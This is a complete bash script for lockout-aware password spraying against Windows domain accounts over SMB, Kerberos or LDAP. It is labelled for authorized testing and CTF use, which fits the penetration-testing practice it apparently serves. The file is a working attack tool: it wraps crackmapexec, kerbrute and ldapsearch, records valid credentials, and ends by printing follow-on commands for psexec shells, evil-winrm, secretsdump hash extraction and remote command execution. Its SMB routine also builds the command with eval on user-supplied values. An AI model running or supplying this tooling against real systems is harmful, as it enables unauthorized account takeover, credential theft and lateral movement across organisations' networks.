#!/bin/bash
# password_spray.sh — Lockout-aware credential spraying
#
# FOR AUTHORIZED TESTING AND CTF USE ONLY
#
# USAGE:
#   ./password_spray.sh -t 10.10.10.5 -u users.txt -p "Password123" -d DOMAIN
#   ./password_spray.sh -t 10.10.10.5 -u users.txt -P passwords.txt -d DOMAIN

TARGET=""; DOMAIN=""; USER_FILE=""; SINGLE_PASS=""; PASS_FILE=""
PROTOCOL="smb"; DELAY=30; OUTDIR=""; THRESHOLD=0

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
die()   { echo -e "${RED}[!] $*${RESET}" >&2; exit 1; }
info()  { echo -e "${CYAN}[*] $*${RESET}"; }
good()  { echo -e "${GREEN}[+] $*${RESET}"; }
warn()  { echo -e "${YELLOW}[-] $*${RESET}"; }
hit()   { echo -e "${RED}${BOLD}[HIT] $*${RESET}"; }
header(){ echo -e "\n${BOLD}$(printf '=%.0s' {1..60})${RESET}"; echo -e "${BOLD}${CYAN}  $*${RESET}"; echo -e "${BOLD}$(printf '=%.0s' {1..60})${RESET}"; }

usage() {
    echo -e "password_spray.sh — Lockout-aware credential spraying"
    echo -e ""
    echo -e "  -t <ip>        Target IP (required)"
    echo -e "  -d <domain>    Domain name (required for SMB/Kerberos)"
    echo -e "  -u <file>      User list file (required)"
    echo -e "  -p <password>  Single password to spray"
    echo -e "  -P <file>      Password list (one spray round per password, with delay)"
    echo -e "  -r <proto>     Protocol: smb | kerberos | ldap  (default: smb)"
    echo -e "  -D <secs>      Delay between spray rounds in seconds (default: 30)"
    echo -e "  -T <count>     Stop after this many hits (default: 0 = no limit)"
    echo -e "  -o <dir>       Output directory"
    echo -e "  -h             Help"
    echo -e ""
    echo -e "⚠  Always check password policy lockout threshold before spraying."
    echo -e "   Use crackmapexec smb <target> --pass-pol to check first."
    echo -e ""
    echo -e "Examples:"
    echo -e "  $0 -t 10.10.10.5 -d corp.local -u users.txt -p \"Password123\""
    echo -e "  $0 -t 10.10.10.5 -d corp.local -u users.txt -P passwords.txt -D 60"
    echo -e "  $0 -t 10.10.10.5 -d corp.local -u users.txt -p \"Spring2024!\" -r kerberos"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t) TARGET="$2";      shift 2 ;;
        -d) DOMAIN="$2";      shift 2 ;;
        -u) USER_FILE="$2";   shift 2 ;;
        -p) SINGLE_PASS="$2"; shift 2 ;;
        -P) PASS_FILE="$2";   shift 2 ;;
        -r) PROTOCOL="$2";    shift 2 ;;
        -D) DELAY="$2";       shift 2 ;;
        -T) THRESHOLD="$2";   shift 2 ;;
        -o) OUTDIR="$2";      shift 2 ;;
        -h|--help) usage ;;
        *) shift ;;
    esac
done

[[ -z "$TARGET" ]]    && { warn "Target required (-t)";    usage; }
[[ -z "$USER_FILE" ]] && { warn "User file required (-u)"; usage; }
[[ -z "$SINGLE_PASS" && -z "$PASS_FILE" ]] && { warn "Password required (-p or -P)"; usage; }
[[ -f "$USER_FILE" ]] || die "User file not found: $USER_FILE"
[[ -n "$PASS_FILE" && ! -f "$PASS_FILE" ]] && die "Password file not found: $PASS_FILE"

[[ -z "$OUTDIR" ]] && OUTDIR="./spray_${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"
HITS_FILE="$OUTDIR/valid_credentials.txt"
touch "$HITS_FILE"

user_count=$(grep -cv '^\s*#\|^\s*$' "$USER_FILE")

header "PASSWORD SPRAY — $PROTOCOL"
info "Target   : $TARGET"
info "Domain   : ${DOMAIN:-none}"
info "Users    : $user_count"
info "Protocol : $PROTOCOL"
info "Delay    : ${DELAY}s between rounds"
echo ""
warn "⚠  Ensure you have checked the lockout policy before proceeding!"
warn "   crackmapexec smb $TARGET --pass-pol -u '' -p ''"
echo ""
read -rp "$(echo -e "${YELLOW}Continue? [y/N]:${RESET} ")" confirm
[[ "$confirm" =~ ^[Yy]$ ]] || { warn "Aborted."; exit 0; }

# Build password list
PASSWORDS=()
if [[ -n "$SINGLE_PASS" ]]; then
    PASSWORDS=("$SINGLE_PASS")
elif [[ -n "$PASS_FILE" ]]; then
    mapfile -t PASSWORDS < <(grep -v '^\s*#\|^\s*$' "$PASS_FILE")
fi

total_hits=0

# ── Spray function ────────────────────────────────────────────────────────────
spray_smb() {
    local password="$1"
    local CME
    CME=$(command -v crackmapexec || command -v cme 2>/dev/null)
    [[ -z "$CME" ]] && { warn "crackmapexec not found: sudo apt install crackmapexec"; return; }

    local result
    result=$(eval "$CME smb '$TARGET' -u '$USER_FILE' -p '$password' \
        ${DOMAIN:+-d '$DOMAIN'} --continue-on-success 2>/dev/null")

    echo "$result" | grep -i "\[+\]\|\bPwn3d\b" | while read -r line; do
        hit "$line"
        echo "$line" >> "$HITS_FILE"
        ((total_hits++))
    done

    echo "$result" >> "$OUTDIR/spray_smb_$(echo "$password" | tr -dc '[:alnum:]').txt"
}

spray_kerberos() {
    local password="$1"
    [[ -z "$DOMAIN" ]] && { warn "Domain required for Kerberos spray (-d)"; return; }

    if command -v kerbrute &>/dev/null; then
        kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET" "$USER_FILE" "$password" \
            2>/dev/null | tee -a "$OUTDIR/spray_kerbrute.txt" | \
            grep "VALID\|SUCCESS" | while read -r line; do
                hit "$line"
                echo "$line" >> "$HITS_FILE"
                ((total_hits++))
            done
    else
        warn "kerbrute not found — falling back to CME Kerberos auth"
        spray_smb "$password"
    fi
}

spray_ldap() {
    local password="$1"
    [[ -z "$DOMAIN" ]] && { warn "Domain required for LDAP spray (-d)"; return; }
    command -v ldapsearch &>/dev/null || { warn "ldapsearch not found"; return; }

    while IFS= read -r user; do
        [[ -z "$user" || "$user" =~ ^# ]] && continue
        result=$(ldapsearch -x -H "ldap://$TARGET" \
            -D "${user}@${DOMAIN}" -w "$password" \
            -b "" "(objectClass=*)" dn 2>&1 | head -3)
        if echo "$result" | grep -qv "Invalid credentials\|error\|Can't contact"; then
            hit "LDAP valid: ${user}@${DOMAIN} : $password"
            echo "${user}@${DOMAIN}:${password}" >> "$HITS_FILE"
            ((total_hits++))
        fi
    done < <(grep -v '^\s*#\|^\s*$' "$USER_FILE")
}

# ── Main spray loop ───────────────────────────────────────────────────────────
round=1
total_rounds=${#PASSWORDS[@]}

for password in "${PASSWORDS[@]}"; do
    header "ROUND $round / $total_rounds — Password: $password"
    info "Spraying $user_count users at $(date +%H:%M:%S)..."

    case "$PROTOCOL" in
        smb)      spray_smb      "$password" ;;
        kerberos) spray_kerberos "$password" ;;
        ldap)     spray_ldap     "$password" ;;
        *) warn "Unknown protocol: $PROTOCOL (use smb/kerberos/ldap)" ;;
    esac

    # Check hit threshold
    current_hits=$(wc -l < "$HITS_FILE")
    if [[ "$THRESHOLD" -gt 0 && "$current_hits" -ge "$THRESHOLD" ]]; then
        good "Hit threshold ($THRESHOLD) reached — stopping."
        break
    fi

    # Delay between rounds (skip after last round)
    ((round++))
    if [[ "$round" -le "$total_rounds" ]]; then
        info "Waiting ${DELAY}s before next round (lockout protection)..."
        sleep "$DELAY"
    fi
done

# ── Summary ───────────────────────────────────────────────────────────────────
header "RESULTS"
final_hits=$(wc -l < "$HITS_FILE")
if [[ "$final_hits" -gt 0 ]]; then
    good "$final_hits valid credential(s) found:"
    cat "$HITS_FILE" | sed 's/^/  /'
    echo ""
    info "Next steps with valid creds:"
    echo "  SMB shell  : psexec.py domain/user:pass@$TARGET"
    echo "  WinRM      : evil-winrm -i $TARGET -u user -p pass"
    echo "  Secretsdump: secretsdump.py domain/user:pass@$TARGET"
    echo "  CME exec   : crackmapexec smb $TARGET -u user -p pass -x 'whoami'"
else
    warn "No valid credentials found."
fi
good "Full output: $OUTDIR"
